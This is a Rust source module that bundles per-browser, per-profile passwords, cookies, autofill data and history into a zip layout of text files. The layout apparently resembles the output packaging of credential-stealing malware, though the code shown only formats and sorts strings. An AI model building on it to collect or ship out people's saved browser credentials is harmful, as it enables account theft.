//! Zip layout: Browser/Profile/{passwords,cookies,autofill,history}.txt

pub const PROFILE_FILES: &[&str] = &["passwords.txt", "cookies.txt", "autofill.txt", "history.txt"];

pub fn push_profile_bundle(
    results: &mut Vec<(String, String)>,
    browser: &str,
    profile: &str,
    passwords: Option<String>,
    cookies: Option<String>,
    autofill: Option<String>,
    history: Option<String>,
) {
    let base = format!("{browser}/{profile}");
    let contents = [
        passwords.unwrap_or_default(),
        cookies.unwrap_or_else(|| super::netscape::empty_file()),
        autofill.unwrap_or_default(),
        history.unwrap_or_default(),
    ];
    for (filename, content) in PROFILE_FILES.iter().zip(contents) {
        results.push((format!("{base}/{filename}"), content));
    }
}

pub fn sort_entries(files: &mut [(String, String)]) {
    files.sort_by(|a, b| a.0.cmp(&b.0));
}
